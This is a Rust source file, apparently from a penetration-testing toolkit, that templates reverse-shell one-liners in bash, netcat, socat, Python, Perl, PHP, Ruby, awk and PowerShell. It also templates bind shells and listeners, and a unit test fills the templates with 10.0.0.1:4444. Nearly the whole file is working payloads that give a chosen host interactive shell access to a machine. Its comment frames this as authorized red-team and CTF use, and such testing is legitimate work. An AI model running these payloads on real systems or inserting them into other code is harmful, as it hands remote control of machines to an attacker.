//! Reverse / bind shell one-liner generator and matching listeners.
//!
//! For **authorized** penetration testing, red-team engagements and CTF use.
//! Everything is plain string templating — no payloads are executed.

/// A named payload (e.g. ("bash", "bash -i >& /dev/tcp/...")).
pub type Payload = (&'static str, String);

/// Reverse-shell one-liners that connect back to `ip:port`.
pub fn reverse_shells(ip: &str, port: u16) -> Vec<Payload> {
    vec![
        ("bash -i", format!("bash -i >& /dev/tcp/{ip}/{port} 0>&1")),
        ("bash 196", format!("0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196")),
        ("sh", format!("sh -i >& /dev/tcp/{ip}/{port} 0>&1")),
        ("nc -e", format!("nc {ip} {port} -e /bin/sh")),
        ("nc mkfifo", format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")),
        ("ncat", format!("ncat {ip} {port} -e /bin/bash")),
        ("socat", format!("socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane")),
        ("python3", format!(
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"
        )),
        ("perl", format!(
            "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        )),
        ("php", format!("php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")),
        ("ruby", format!(
            "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )),
        ("awk", format!(
            "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(1){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline) > 0) print $0 |& s;close(c)}}}} while(c!=\"exit\")}}}}' /dev/null"
        )),
        ("powershell", format!(
            "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}}\""
        )),
    ]
}

/// Bind-shell one-liners that listen on `port` on the target.
pub fn bind_shells(port: u16) -> Vec<Payload> {
    vec![
        ("nc -e", format!("nc -lvnp {port} -e /bin/sh")),
        ("ncat", format!("ncat -lvnp {port} -e /bin/bash")),
        ("socat", format!("socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash")),
        ("python3", format!(
            "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"
        )),
    ]
}

/// Listener commands to catch a reverse shell on `port`.
pub fn listeners(port: u16) -> Vec<Payload> {
    vec![
        ("nc", format!("nc -lvnp {port}")),
        ("ncat (TLS)", format!("ncat -lvnp {port} --ssl")),
        ("socat (pty)", format!("socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}")),
        ("pwncat", format!("pwncat-cs -lp {port}")),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn templates_fill_host_and_port() {
        let rs = reverse_shells("10.0.0.1", 4444);
        assert!(rs.iter().any(|(n, c)| *n == "bash -i" && c.contains("/dev/tcp/10.0.0.1/4444")));
        assert!(rs.iter().any(|(_, c)| c.contains("10.0.0.1") && c.contains("4444")));
        assert!(listeners(4444).iter().any(|(_, c)| c.contains("4444")));
        assert!(bind_shells(9001).iter().any(|(_, c)| c.contains("9001")));
    }
}
